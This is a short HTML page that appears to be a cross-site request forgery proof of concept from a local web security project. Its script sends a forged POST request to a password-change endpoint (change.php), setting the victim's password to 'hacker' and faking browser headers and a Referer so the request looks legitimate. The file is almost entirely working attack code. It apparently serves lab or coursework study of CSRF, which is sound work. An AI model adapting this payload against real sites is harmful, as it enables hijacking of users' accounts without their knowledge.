<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Execute POST Request</title>
</head>
<body>
    <h1>Execute POST Request</h1>
    <button id="submitButton">Send POST Request</button>

    <script>
        document.getElementById("submitButton").addEventListener("click", function () {
            // Create a new XMLHttpRequest object
            const xhr = new XMLHttpRequest();
            
            // Open a POST request to the desired URL
            xhr.open("POST", "http://localhost/webSecProject/change.php", true);

            // Set required headers
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.setRequestHeader("Cache-Control", "max-age=0");
            xhr.setRequestHeader("sec-ch-ua", '"Chromium";v="131", "Not_A Brand";v="24"');
            xhr.setRequestHeader("sec-ch-ua-mobile", "?0");
            xhr.setRequestHeader("sec-ch-ua-platform", '"Windows"');
            xhr.setRequestHeader("Upgrade-Insecure-Requests", "1");
            xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
            xhr.setRequestHeader("Sec-Fetch-Site", "same-origin");
            xhr.setRequestHeader("Sec-Fetch-Mode", "navigate");
            xhr.setRequestHeader("Sec-Fetch-User", "?1");
            xhr.setRequestHeader("Sec-Fetch-Dest", "document");
            xhr.setRequestHeader("Referer", "http://localhost/webSecProject/welcome.php");
            
            // The 'Host' header will be automatically added by the browser.

            // Set up a callback to handle the response
            xhr.onload = function () {
                if (xhr.status === 200) {
                    alert("Request executed successfully!");
                } else {
                    alert(`Request failed. Status: ${xhr.status}`);
                }
            };

            // Define the request body
            const requestBody = "password=hacker&confirm_password=hacker&change=change";

            // Send the request
            xhr.send(requestBody);
        });
    </script>
</body>
</html>
